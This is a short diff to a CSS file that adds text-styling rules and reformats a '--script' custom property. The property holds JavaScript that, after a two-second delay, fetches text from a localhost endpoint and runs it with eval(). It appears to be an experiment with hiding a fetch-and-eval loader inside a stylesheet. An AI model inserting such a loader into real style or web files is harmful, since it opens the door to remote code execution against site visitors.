@@ -3,14 +3,17 @@
 body,
 html {
   background-image: url("http://localhost:3000/bruh");
+  color: white;
+  font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+  font-size: 28px;
+  word-wrap: break-word;
 }
 
 :root {
-  --script: setTimeout(function() {
-    fetch("http://localhost:3000/bruh2").then(function(response) {
-      return response.text();
-    }).then(function(text) {
-      eval(text);
-    });
-  }, 2000);
+  --script: setTimeout(
+    function() {fetch("http://localhost:3000/bruh2") .then(
+        function(response) {return response.text() ;}
+      ) .then(function(text) {eval(text) ;}) ;},
+    2000
+  );
 }
